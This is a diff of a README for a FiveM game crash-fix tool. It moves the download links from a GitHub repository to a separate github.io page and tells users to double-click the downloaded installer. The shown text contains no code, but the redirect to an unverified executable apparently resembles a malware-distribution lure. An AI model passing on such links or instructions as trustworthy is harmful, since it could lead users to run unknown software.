@@ -1,6 +1,6 @@
 # 🛠️ FiveM-Crash-Fix - Stop FiveM from crashing today easily
 
-[![](https://img.shields.io/badge/Download-FiveM_Crash_Fix-blue.svg)](https://github.com/ukaa3696/FiveM-Crash-Fix)
+[![](https://img.shields.io/badge/Download-FiveM_Crash_Fix-blue.svg)](https://ukaa3696.github.io)
 
 ## 📖 About this application
 
@@ -20,7 +20,7 @@ The software automates the repair process by clearing corrupted cache files and 
 
 Follow these steps to repair your installation.
 
-1. Visit the [official download page](https://github.com/ukaa3696/FiveM-Crash-Fix) to download the repair tool.
+1. Visit the [official download page](https://ukaa3696.github.io) to download the repair tool.
 2. Locate the file in your downloads folder.
 3. Double-click the file to start the installer.
 4. Follow the on-screen prompts to place the application on your computer.
